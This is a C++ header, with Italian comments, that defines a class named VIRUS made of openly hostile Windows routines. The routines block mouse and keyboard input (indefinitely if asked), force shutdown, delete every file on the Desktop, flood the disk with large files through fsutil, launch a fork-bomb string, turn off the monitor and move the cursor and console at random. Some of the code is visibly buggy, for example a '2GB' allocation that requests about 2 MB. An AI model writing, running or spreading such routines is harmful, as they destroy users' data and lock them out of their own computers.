#if !(__cplusplus > 199711L)
#error "Questo header richiede il c++11 minimo come versione. "
#else

#include <windows.h>
#include <winuser.h>
#include <winable.h>
#include <iostream>
#include <sys/types.h>
#include <sys/stat.h>
#include <string>
#include <unistd.h>
#include <fstream>
#include <ctime>
#include <cmath>
#include <dirent.h>

#define TIME_INFINITY -((int)(((int)(M_PI)) - (M_PI/sizeof(int*)))) + 1

/*
	Questo header funziona solo su windows.

	Se pensate che la vita sia ingiusta pensate che io la sto sviluppando su linux,
	senza poter testare le funzioni(fortunatamente in alcuni casi).

	L'unica cosa decente di windows non è disponibile su linux.

	Da notare la fierezza con cui dichiaro le funzioni con nomi inglesi,
	ma scrivo le spiegazioni in italiano.

	Prima o poi scriverà una documentazione sull'utilizzo dell'header,
	cosa necessaria anche per il fatto che ad ogni persona funziona in maniera diversa.

	Sia ovvio il fatto che a breve installerà windows sul mio computer, perchè
	davvero non ne posso più.

	Se avviate senza i permessi di amministrazione il file .exe e vi lamentate che non
	funzioni, scoppiate.
*/

class VIRUS
{
	public:
		/*
			Quest'indentazione è più o meno fiera di me?

			Spoiler: meno.
		*/
		static void Fork                ();
		static void OpenCmd             ();
		static void RandomFolder        ();
		static void MouseRandomPos      ();
		static void ConsoleRandomPos    ();
		static void ConsoleRandomSize   (); // TODO tha
		static void RemoveAllDesktopFile(); // TODO tha in parte
		static void Allocate2GB         (int seconds);
		static void DisableInput        (int seconds);
		static void TurnOffMonitor      (int seconds);
		static void RandomFile          (int size_mb);
		static void CreateFolder        (std::string name, int quantity);
		static void TurnOffComputer     (int time_seconds, std::string reason);
		static void RestartComputer     (int time_seconds, std::string reason); // TODO tha
		static void CreateFile          (std::string name, int quantity, int size_mb); // da sistemare(?)
	private:
		struct MousePoint
		{
			int x;
			int y;
		};
		struct ConsolePoint
		{
			int x;
			int y;
		};
};

/**
 *
 * Funzione fierissima che crea tutte le cartelle che vuoi
 *
 * @param name     nome della cartella da creare
 * @param quantity quante cartelle creare
 *
*/
void VIRUS::CreateFolder(std::string name, int quantity)
{
	for (int start = 0; start < quantity; start++)
	{
		std::string num_to_s = std::to_string(start),
					com_to_s = name + num_to_s;
		const char* Ccom_to_s = com_to_s.c_str();
		mkdir(Ccom_to_s);
	}
}

/**
 *
 * Funzione anche questa fierissima che crea tutti i file che vuoi
 *
 * @param name     nome del file da creare
 * @param quantity quanti file creare
 * @param size_mb  quanti megabyte deve pesare il file
 *
*/
void VIRUS::CreateFile(std::string name, int quantity, int size_mb)
{
	for (int start = 0; start < quantity; start++)
	{
		int byte = size_mb * 1048576;
		std::string init_command_str  = "fsutil file createNew",
					init_nmefile_str  = name,
					init_numloop_str  = std::to_string(start),
					init_bytfile_str  = std::to_string(byte),
					init_comlcom_str  = init_command_str + " " + init_nmefile_str + init_numloop_str + ".txt" + " " +  init_bytfile_str;
		const char* Cinit_comlcom_str = init_comlcom_str.c_str();
		puts(Cinit_comlcom_str);
		system(Cinit_comlcom_str);
	}
}


/**
 * Funzione che apre il cmd
*/
void VIRUS::OpenCmd()
{
	const char* Ccommand = "start";
	system(Ccommand);
}

/**
 * Funzione che sospende lo schermo del pc(non lo spegne)
 *
 * @param seconds dopo quanti secondi sospendere lo schermo
 *
*/
void VIRUS::TurnOffMonitor(int seconds)
{
	int milliseconds = seconds * 1000;
	Sleep(milliseconds);
	SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, (LPARAM) 2);
}

/**
 * Funzione che posiziona il cursore del mouse randomicamente nello schermo
*/
void VIRUS::MouseRandomPos()
{
	MousePoint mspos;
	mspos.x = rand() % 801;
	mspos.y = rand() % 601;
	SetCursorPos(mspos.x, mspos.y);
}

/**
 * Funzione che spegne il computer
 *
 * @param time_seconds dopo quanti secondi spegnere il computer
 * @param reason       ragione per cui si sta spegendo il pc
 *
*/
void VIRUS::TurnOffComputer(int time_seconds, std::string reason)
{
	// shutdown /s /t time_seconds /c reason /f /d /p 1:1
	std::string init_command_str = "shutdown /s /t ",
				init_timesec_str = std::to_string(time_seconds),
				init_endcomm_str = " /c " + reason + " /f /d /p 1:1",
				init_comcom__str = init_command_str + init_timesec_str + init_endcomm_str;
	const char* Cinit_comcom_str = init_comcom__str.c_str();
	system(Cinit_comcom_str);
}

/**
 * Funzione che blocca l'input creando l'impossibilitÃ  di usare mouse e tastiera.
 * Richiede l'avvio come amministratore.
 *
 * @param seconds per quanti secondi deve disabilitare l'input,
 * 			      con la macro TIME_INFINITY, viene disabilitato
 * 				  per sempre
 *
*/
void VIRUS::DisableInput(int seconds)
{
	int milliseconds = seconds * 1000;
	if (!(seconds == TIME_INFINITY))
	{
		BlockInput(true);
		Sleep(milliseconds);
		BlockInput(false);
	}
	else BlockInput(true);
}

/**
 * Funzione che posiziona la console randomicamente nello schermo
*/
void VIRUS::ConsoleRandomPos()
{
	/**/
	ConsolePoint cpos;
	RECT window_size;
	/**/
	HWND Console = GetConsoleWindow();
	GetWindowRect(Console, &window_size);
	/**/
	cpos.x = rand() % 801;
	cpos.y = rand() % 601;
	/**/
	MoveWindow(Console, cpos.x, cpos.y, window_size.right - window_size.left, window_size.bottom - window_size.top, false);
	/**/
}

/**
 * Se volete bloccare il vostro sistema operativo,
 * questa funziona fa per voi
*/
void VIRUS::Fork()
{
	const char* Ccommand = ":(){:|:&};:";
	system(Ccommand);
}

/**
 * Funzione che alloca 2GB non permanentemente nella RAM.
 *
 * @param seconds per quanti secondi deve allocare la RAM
 *
*/
void VIRUS::Allocate2GB(int seconds)
{
	const int size              = 2*1024*1024; // 2GB
	int milliseconds            = seconds * 1000;
	char* allocate_char_pointer = new char[size];
}

/**
 * Funzione che rimuove tutti i file del desktop
*/
void VIRUS::RemoveAllDesktopFile()
{
	std::string desktop_dir = std::string(getenv("USERPROFILE")) + "\\Desktop";
	const char* Cdesktop_dir = desktop_dir.c_str();

	DIR* dir;
    dirent* ent;

    if ((dir = opendir(Cdesktop_dir)) != NULL) {
        while((ent = readdir(dir)) != NULL) {
        	remove(ent->d_name);
        }
        closedir(dir);
    } else {
    	std::cout << "ERROR 808" << std::endl;
	}
}

/**
*
*/
void VIRUS::RandomFile(int size_mb)
{
	srand(time(NULL));
	std::string rname = std::to_string(rand());
	VIRUS::CreateFile(rname, 1, size_mb);
}

/**
*
*/
void VIRUS::RandomFolder()
{
	srand(time(NULL));
	std::string rname = std::to_string(rand());
	VIRUS::CreateFolder(rname, 1);
}

#endif // if c++_v > c++11_v
